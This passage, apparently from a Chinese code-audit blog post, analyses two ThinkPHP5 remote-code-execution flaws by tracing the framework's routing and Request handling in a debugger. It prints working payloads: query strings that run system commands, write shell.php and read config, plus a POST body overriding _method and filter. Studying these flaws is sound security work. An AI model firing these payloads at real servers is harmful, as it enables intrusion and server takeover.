+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195412631.png" alt="image-20240611195412631"></p>
+<p>这里依次向浏览器发送了状态码、headers头信息以及得到的内容结果</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195706638.png" alt="image-20240611195706638"></p>
+<p>输出完毕后，跳到了appShutdown()方法，保存日志并结束了整个程序运行。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195752803.png" alt="image-20240611195752803"></p>
+<p>至此，算是初步了解了TP5的框架流程，但仍有诸多疑惑，反复观看即可</p>
+<h1 id="0x03-漏洞分析">0x03 漏洞分析</h1>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611205510773.png" alt="image-20240611205510773"></p>
+<h2 id="rce1类名解析导致任意类方法调用">RCE1—类名解析导致任意类方法调用</h2>
+<h3 id="概述">概述</h3>
+<p>本次漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，从而调用<strong>invokefunction方法</strong>，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p>
+<p>漏洞影响版本： <strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong>。</p>
+<p>不同版本 <strong>payload</strong> 需稍作调整：</p>
+<p>5.1.x:</p>
+<pre><code class="hljs scss">?s=index/\think\Request/<span class="hljs-selector-tag">input</span>&amp;<span class="hljs-attribute">filter</span><span class="hljs-selector-attr">[]</span>=system&amp;data=pwd?s=index/\think\view\driver\Php/<span class="hljs-attribute">display</span>&amp;<span class="hljs-attribute">content</span>=&lt;?php <span class="hljs-built_in">phpinfo</span>();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell<span class="hljs-selector-class">.php</span>&amp;<span class="hljs-attribute">content</span>=&lt;?php <span class="hljs-built_in">phpinfo</span>();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=id</code></pre>
+<p>5.0.x:</p>
+<pre><code class="hljs scss">?s=index/think\config/get&amp;name=database<span class="hljs-selector-class">.username</span> # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test<span class="hljs-selector-class">.jpg</span>    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t<span class="hljs-selector-class">.php</span>     # 包含任意<span class="hljs-selector-class">.php</span>文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=id</code></pre>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>这里以5.0.10版本的thinkphp来分析。以这个POC为例：</p>
+<pre><code class="hljs scss">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=ipconfig</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611210118228.png" alt="image-20240611210118228"></p>
+<p>老地方下断点，跟进routeCheck</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611210343140.png" alt="image-20240611210343140"></p>
+<p>跟进path =》pathinfo</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611210419757.png" alt="image-20240611210419757"></p>
+<p>这里判断是否是兼容模式参数的形式，全局搜索var_pathinfo发现被初始化为s，这样我们的payload中的s的get传参也就说通了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612083024287.png" alt="image-20240612083024287"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611210539230.png" alt="image-20240611210539230"></p>
+<p>最后的pathinfo也就是上述图片的值了：index/think\app/invokefunction</p>
+<p>继续往下跟进发现checkRoute</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612083515842.png" alt="image-20240612083515842"></p>
+<p>这里进行的是路由规则的检测，跟进parseUrl</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612084007442.png" alt="image-20240612084007442"></p>
+<p>跟进parseUrlPath</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612084032870.png" alt="image-20240612084032870"></p>
+<p>这里是想获取到控制器，操作函数以及对应的参数，但根据url参数的值，这里最终返回的数组，也只有个path数组的三个元素</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612085101130.png" alt="image-20240612085101130"></p>
+<p>返回去继续跟进，下面这里是相应的获取控制器、操作、传的参数，array_shift是取出数组的头部元素</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612084507694.png" alt="image-20240612084507694"></p>
+<p>最后返回内容如下，路由被分成三个部分</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612084457851.png" alt="image-20240612084457851"></p>
+<p>继续跟进到了这里，又是获取当前调度信息，然后执行到后面的exec函数，我们跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612085447131.png" alt="image-20240612085447131"></p>
+<p>跟进module</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612085525117.png" alt="image-20240612085525117"></p>
+<p>获取到module模块为index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612085705090.png" alt="image-20240612085705090"></p>
+<p>这一段代码似乎是给request类进行参数的赋值</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612085946578.png" alt="image-20240612085946578"></p>
+<p>再次获取当前url对应的控制器名，模块和操作名</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090046463.png" alt="image-20240612090046463"></p>
+<p>跟进到controller，这里判断name参数是否存在符号\，这里显然是存在的，于是跟进这里的request的操作</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090220521.png" alt="image-20240612090220521"></p>
+<p>先进行request的实例化</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090301219.png" alt="image-20240612090301219"></p>
+<p>返回module：index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090338803.png" alt="image-20240612090338803"></p>
+<p>获取到了当前的类名，然后执行invokeClass，尝试反射获取到类</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090430233.png" alt="image-20240612090430233"></p>
+<p>这里最后得到了一个实例化类对象</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090527746.png" alt="image-20240612090527746"></p>
+<p>这里获取到操作方法之后，判断相对应的类是否存在这个方法，存在的话，给call赋值成数组形式，然后调用invokeMethod</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090641046.png" alt="image-20240612090641046"></p>
+<p>根据传进去的参数得到类名，然后根据类名和其方法，调用得到一个反射对象</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612090844153.png" alt="image-20240612090844153"></p>
+<p>跟进bindParams，直接就进入到这里的input</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612091645468.png" alt="image-20240612091645468"></p>
+<p>经过input处理，最终得到函数call_user_func_array</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612091912969.png" alt="image-20240612091912969"></p>
+<p>最终返回函数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612092324811.png" alt="image-20240612092324811"></p>
+<p>回来之后调用了invokeArgs</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612092352231.png" alt="image-20240612092352231"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612092700561.png" alt="image-20240612092700561"></p>
+<p>这里由call_user_func_array函数调用invokeArgs，利用system对象的实例，传给ipconfig参数执行</p>
+<pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">"system"</span>,<span class="hljs-string">"ipconfig"</span>)</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612092856135.png" alt="image-20240612092856135"></p>
+<p>最后RCE</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612093120929.png" alt="image-20240612093120929"></p>
+<h3 id="问题">问题</h3>
+<p>由于对上述流程分析还是不够清晰，这里再找几篇文章对比补充一下，增强印象</p>
+<p>首先是针对payload：</p>
+<pre><code class="hljs php">?s=index/think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">ipconfig</span></span></code></pre>
+<p>我们对于上述整体流程知道，针对路由模块、操作函数名以及最后传的参数都没有过滤，但首先我们考虑一下，为何这里可以选择think\app类</p>
+<p>我们可以在文件app.php下一个断点看一下输出</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612095958992.png" alt="image-20240612095958992"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240612100745264.png" alt="image-20240612100745264"></p>
+<p>可以看到当前能利用的类都在上面了，而我们用到的think\app，其中的RCE函数如下，属性是public的静态方法</p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeFunction</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$vars</span> = []</span>)</span>
+<span class="hljs-function">    </span>{
+        <span class="hljs-variable">$reflect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionFunction</span>(<span class="hljs-variable">$function</span>);
+        <span class="hljs-variable">$args</span>    = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">bindParams</span>(<span class="hljs-variable">$reflect</span>, <span class="hljs-variable">$vars</span>);
+        <span class="hljs-comment">// 记录执行信息</span>
+        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$debug</span> &amp;&amp; <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">record</span>(<span class="hljs-string">'[ RUN ] '</span> . <span class="hljs-variable">$reflect</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>(), <span class="hljs-string">'info'</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$reflect</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-variable">$args</span>);
+    }</code></pre>
+<p>即先得到传出函数function，获取到函数的相关信息，然后调用bindParams，将参数和该对象进行绑定；用日志记录相关信息，然后调用invokeArgs，传入参数args，利用反射调用函数reflect</p>
+<p>至此，我们也就知道，可以自己拓展，根据这里app存在的类，我们可以一个个跟踪调试，查找其他可以getshell的方法或者payload</p>
+<h2 id="rce2request核心类变量覆盖">RCE2—Request核心类变量覆盖</h2>
+<h3 id="概述">概述</h3>
+<p>Request核心类**$method** 来自可控的 <strong>$_POST</strong> 数组，而且在获取之后没有进行任何检查，直接把它作为 <strong>Request</strong> 类的方法进行调用，同时，该方法传入的参数是可控数据 <strong>$_POST</strong> 。导致可以随意调用 <strong>Request</strong> 类的部分方法</p>
+<blockquote>
+<p><strong>过程：</strong><br>
+让method等于 <code>__construct</code>魔术方法，然后里面的 <code>foreach</code>函数造成变量覆盖。然后通过<strong>Request</strong> 类中的 <code>param</code>方法最终又调用了<code>filterValue</code>方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数，从而执行任意命令</p>
+</blockquote>
+<blockquote>
+<p><strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p>
+</blockquote>
+<p><strong>POC：</strong></p>
+<p><strong>ThinkPHP 5.0.0 - 5.0.12 无条件触发</strong></p>
+<pre><code class="hljs scss">POST / HTTP/<span class="hljs-number">1.1</span>
+_method=__construct&amp;<span class="hljs-attribute">filter</span>=system&amp;method=GET&amp;<span class="hljs-selector-tag">a</span>=whoami
